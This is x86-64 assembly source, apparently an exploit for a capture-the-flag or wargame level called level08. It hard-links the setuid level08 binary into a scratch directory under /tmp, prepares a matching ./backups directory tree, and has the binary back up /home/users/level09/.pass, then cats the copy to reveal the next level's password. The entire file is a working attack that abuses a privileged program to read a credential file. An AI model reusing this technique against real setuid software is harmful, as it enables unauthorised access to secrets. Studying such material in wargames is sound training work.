
format ELF64 executable $03
entry _start

struc string data*& {
    .: db data
    .length = ($ - .)
}

struc timespec {
    .tv_sec: rq $01
    .tv_nsec: rq $01
}

virtual at $00
    timespec timespec
    timespec.sizeof = $
end virtual

S_IRWXU = $01C0
S_IRWXG = $0038
S_IRWXO = $0007

S_IRGRP = $0020
S_IWGRP = $0010
S_IROTH = $0004
S_IWOTH = $0002

segment executable readable
_start:
    mov rax, $53
    mov rdi, _tmp
    mov rsi, S_IRWXU or S_IRWXG or S_IRWXO
    syscall
    test rax, rax
    jnz .error
    mov rax, $50
    mov rdi, _tmp
    syscall
    test rax, rax
    jnz .exit
    
rept $04 i:$01 
{
    mov rax, $53
    mov rdi, _path_#i
    mov rsi, S_IRWXU or S_IRWXG or S_IRWXO
    syscall 
    test rax, rax
    jnz .exit
    mov rax, $5A
    mov rdi, _path_#i
    mov rsi, S_IRWXU or S_IRWXG or S_IRWXO
    syscall
    test rax, rax
    jnz .exit
}
    mov rax, $55
    mov rdi, _log
    mov rsi, S_IRWXU or S_IRGRP or S_IWGRP or S_IROTH or S_IWOTH
    syscall
    test rax, rax
    js .exit

    mov rdi, rax
    mov rax, $03
    syscall
    
    mov rax, $5A
    mov rdi, _log
    mov rsi, S_IRWXU or S_IRGRP or S_IWGRP or S_IROTH or S_IWOTH
    syscall
    test rax, rax
    jnz .exit

    mov rax, $58
    mov rdi, _program
    mov rsi, _current
    syscall
    test rax, rax
    jnz .exit
    mov rax, $39
    syscall
    test rax, rax
    jz .child

    mov rcx, timespec.sizeof
    sub rsp, rcx
    xor al, al
    mov rdi, rsp
    cld
    rep stosb
    mov byte [rsp+timespec.tv_sec], $01
    mov rax, $23
    mov rdi, rsp
    xor rsi, rsi
    syscall
    add rsp, timespec.sizeof

    mov rax, $3B
    mov rdi, _cat
    mov rcx, _retrieve
    xor rdx, rdx
    push rdx rcx rdi
    mov rsi, rsp
    syscall
    jmp .exit
.child:
    mov rax, $3B
    mov rdi, _current
    mov rcx, _argument
    xor rdx, rdx
    push rdx rcx rdi
    mov rsi, rsp    
    syscall
.exit:
    mov rax, $3C
    xor rdi, rdi
    syscall
.error:
    mov rax, $01
    mov rdi, $02
    mov rsi, _cant_create_tmp
    mov rdx, _cant_create_tmp.length
    syscall
    jmp .exit

segment readable
_program: db "/home/users/level08/level08", $00
_current: db "./level08", $00
_cat: db "/bin/cat", $00
_retrieve: db "./backups"
_argument: db "/home/users/level09/.pass", $00

_tmp: db "/tmp/exploit", $00
_cant_create_tmp string "[ERROR]: Can't create /tmp/exploit", $0A

_path_1: db "./backups", $00
_path_2: db "./backups/home", $00
_path_3: db "./backups/home/users", $00
_path_4: db "./backups/home/users/level09", $00

_log: db "./backups/.log", $00

